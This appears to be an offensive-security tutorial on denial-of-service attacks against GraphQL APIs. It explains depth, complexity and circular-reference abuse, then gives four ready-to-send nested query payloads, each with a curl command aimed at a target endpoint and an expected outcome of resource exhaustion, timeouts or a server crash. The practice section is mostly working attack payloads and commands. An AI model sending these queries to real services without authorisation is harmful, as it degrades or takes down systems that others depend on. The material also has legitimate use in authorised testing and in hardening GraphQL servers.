---
title: Denial of Service Attacks in GraphQL APIs
description: Explore techniques for exploiting GraphQL APIs through denial of service
  attacks, abusing query depth, complexity, and resource exhaustion.
keywords:
- GraphQL DoS attacks
- query depth exploitation
- resource exhaustion
- GraphQL query complexity
- circular reference attacks
- query bombs
- recursive queries
- timeout exploitation
- GraphQL security
- Denial of Service
---

# Denial of Service Attacks

## Context

This article focuses on leveraging GraphQL endpoints for denial of service (DoS) attacks by abusing query depth, complexity, recursion, and resource exhaustion vectors. A fundamental understanding of GraphQL schema structure, query execution, and resource management in web applications, along with a basic grasp of GraphQL Injection techniques, is presumed.

## Theory

### Resource Exhaustion in GraphQL

Resource exhaustion in the context of GraphQL refers to the act of forcing a server to consume an excessive amount of CPU, memory, or time by crafting specific queries. Due to GraphQLâ€™s flexibility, it is possible to design queries that result in highly expensive server-side operations. Most often, this is facilitated by the absence of limits on query depth, complexity, or recursion, leaving GraphQL APIs vulnerable to DoS attacks.

### Query Depth and Complexity Attacks

Query depth is defined as the maximum nesting level of fields that can be present in a GraphQL query. Query complexity, on the other hand, refers to the overall computational cost that is required to resolve a query, taking into account the multiplicity of fields and recursion. Attackers exploit these characteristics by submitting queries with excessive nesting or complexity to drain server resources. The protocol's recursive resolution of nested fields can be leveraged to exponentially increase the workload on the server.

### Recursive and Circular Reference Exploitation

Recursive queries reference the same type or field repeatedly, which can happen either intentionally or due to the schema's design. Schemas with circular references allow for queries that lead to infinite or excessive recursion. Attackers craft these queries to exploit circular references, potentially triggering stack overflows or memory exhaustion.

### Query Bombs and Timeout Exploitation

A query bomb is a single query intentionally designed to maximize server workload through deep nesting or recursion. When attackers use such query bombs, they can induce timeouts, degrade service performance, or even crash the GraphQL server. The absence of execution timeouts or mechanisms to analyze the cost of a query enhances the risk of DoS attacks through query bombs.

## Practice

### Deeply Nested Query for Depth-Based DoS

- **Payload:**

  ```graphql
  {
      user {
          posts {
              comments {
                  author {
                      posts {
                          comments {
                              author {
                                  id
                              }
                          }
                      }
                  }
              }
          }
      }
  }
  ```

  This query is crafted to have excessive nesting, exploiting depth limits.

- **Command to Execute:**

  ```bash
  curl -X POST http://target/graphql -H 'Content-Type: application/json' --data '{"query": "{ user { posts { comments { author { posts { comments { author { id } } } } } } } }"}'
  ```

  Send the deeply nested query to the GraphQL endpoint.

- **Outcome:** Possible server resource exhaustion leading to CPU or memory spikes, potential crash, or unresponsiveness.

### Recursive Query Exploitation via Circular References

- **Payload:**

  ```graphql
  {
      node {
          parent {
              parent {
                  parent {
                      parent {
                          id
                      }
                  }
              }
          }
      }
  }
  ```

  This query exploits recursive parent references, forcing repeated resolution.

- **Command to Execute:**

  ```bash
  curl -X POST http://target/graphql -H 'Content-Type: application/json' --data '{"query": "{ node { parent { parent { parent { parent { id } } } } } }"}'
  ```

  Submit the recursive query to the endpoint.

- **Outcome:** Likely outcome includes stack overflow, memory exhaustion, or server crash stemming from recursion.

### Query Bomb for Maximum Complexity

- **Payload:**

  ```graphql
  {
      users {
          posts {
              comments {
                  author {
                      posts {
                          comments {
                              author {
                                  posts {
                                      id
                                  }
                              }
                          }
                      }
                  }
              }
          }
      }
  }
  ```

  This query bomb is designed to multiply the workload with nested lists and references.

- **Command to Execute:**

  ```bash
  curl -X POST http://target/graphql -H 'Content-Type: application/json' --data '{"query": "{ users { posts { comments { author { posts { comments { author { posts { id } } } } } } } } }"}'
  ```

  Send the query bomb to the GraphQL endpoint.

- **Outcome:** Severe CPU/memory exhaustion leading to potential denial of service.

### Timeout Exploitation via Large Query Payloads

- **Payload:**

  ```graphql
  {
      users {
          posts {
              comments {
                  author {
                      id
                  }
              }
          }
      }
  }
  ```

  This large yet valid query aims to closely approach server timeout thresholds.

- **Command to Execute:**

  ```bash
  curl -X POST http://target/graphql -H 'Content-Type: application/json' --data '{"query": "{ users { posts { comments { author { id } } } } }"}'
  ```

  Submit the large query to observe for server timeout or degraded response.

- **Outcome:** Potential server response delays, timeouts, or temporary unavailability.

## Tools

- **curl**
- **GraphQL Voyager**
- **InQL**